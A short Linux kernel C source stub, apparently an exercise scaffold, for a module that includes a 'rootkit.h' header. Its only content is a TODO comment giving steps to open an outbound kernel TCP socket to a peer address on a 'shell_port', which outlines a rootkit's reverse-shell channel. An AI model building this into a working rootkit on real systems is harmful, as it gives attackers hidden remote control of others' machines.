// SPDX-License-Identifier: GPL-2.0
#include <linux/err.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/net.h>
#include <linux/socket.h>
#include <net/net_namespace.h>

#include "rootkit.h"

/* ------------------------------------------------------------------ */
/* Outbound TCP connect                                                */
/* ------------------------------------------------------------------ */

/*
 * TODO: Implement rk_connect.
 *
 * 1. Build a struct sockaddr_in with AF_INET, htons(shell_port),
 *    and in_aton(peer_addr_str).
 * 2. Create a kernel TCP socket with sock_create_kern.
 * 3. Connect with kernel_connect.
 * 4. Return the socket on success, ERR_PTR(error) on failure.
 *    Release the socket before returning an error from connect.
 */
